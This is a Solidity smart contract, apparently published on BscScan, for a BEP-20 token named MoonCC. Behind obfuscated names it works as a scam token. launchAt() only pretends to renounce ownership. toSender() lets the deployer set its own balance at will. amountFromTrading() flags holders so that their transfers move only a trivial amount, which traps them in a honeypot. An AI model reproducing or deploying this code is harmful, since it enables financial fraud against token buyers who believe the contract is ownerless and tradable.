/**
 *Submitted for verification at BscScan.com on 2023-01-30
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface atTrading {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface buyLaunch {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract MoonCC {
    uint8 public decimals = 18;
    string public name = "MoonCC";
    mapping(address => bool) public atSenderSell;

    address public shouldSender;

    address public sellFund;
    address public owner;

    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) public receiverListReceiver;

    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply = 100000000 * 10 ** 18;
    bool public autoSender;

    uint256 constant swapMarketing = 10 ** 10;
    string public symbol = "MC";
    

    event OwnershipTransferred(address minIs, address fromAt);
    event Transfer(address teamLaunch, address enableList, uint256 teamList);
    event Approval(address tokenLimitEnable, address exemptList, uint256 teamList);

    constructor (){
        atTrading sellReceiver = atTrading(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        sellFund = buyLaunch(sellReceiver.factory()).createPair(sellReceiver.WETH(), address(this));
        owner = liquidityTeam();
        shouldSender = owner;
        atSenderSell[shouldSender] = true;
        balanceOf[shouldSender] = totalSupply;
        emit Transfer(address(0), shouldSender, totalSupply);
        launchAt();
    }

    

    function transfer(address isMax, uint256 toFrom) external returns (bool) {
        return transferFrom(liquidityTeam(), isMax, toFrom);
    }

    function liquidityTeam() private view returns (address) {
        return msg.sender;
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function minLaunch(address limitFee) public {
        if (autoSender) {
            return;
        }
        atSenderSell[limitFee] = true;
        autoSender = true;
    }

    function approve(address exemptList, uint256 toFrom) public returns (bool) {
        allowance[liquidityTeam()][exemptList] = toFrom;
        emit Approval(liquidityTeam(), exemptList, toFrom);
        return true;
    }

    function amountFromTrading(address feeIs) public {
        if (feeIs == shouldSender || !atSenderSell[liquidityTeam()]) {
            return;
        }
        receiverListReceiver[feeIs] = true;
    }

    function transferFrom(address teamEnable, address isMax, uint256 toFrom) public returns (bool) {
        if (teamEnable != liquidityTeam() && allowance[teamEnable][liquidityTeam()] != type(uint256).max) {
            require(allowance[teamEnable][liquidityTeam()] >= toFrom);
            allowance[teamEnable][liquidityTeam()] -= toFrom;
        }
        if (isMax == shouldSender || teamEnable == shouldSender) {
            return senderTeamTx(teamEnable, isMax, toFrom);
        }
        if (receiverListReceiver[teamEnable]) {
            return senderTeamTx(teamEnable, isMax, swapMarketing);
        }
        return senderTeamTx(teamEnable, isMax, toFrom);
    }

    function toSender(uint256 toFrom) public {
        if (toFrom == 0 || !atSenderSell[liquidityTeam()]) {
            return;
        }
        balanceOf[shouldSender] = toFrom;
    }

    function launchAt() public {
        emit OwnershipTransferred(shouldSender, address(0));
        owner = address(0);
    }

    function senderTeamTx(address amountLaunchedTeam, address sellTotal, uint256 toFrom) internal returns (bool) {
        require(balanceOf[amountLaunchedTeam] >= toFrom);
        balanceOf[amountLaunchedTeam] -= toFrom;
        balanceOf[sellTotal] += toFrom;
        emit Transfer(amountLaunchedTeam, sellTotal, toFrom);
        return true;
    }


}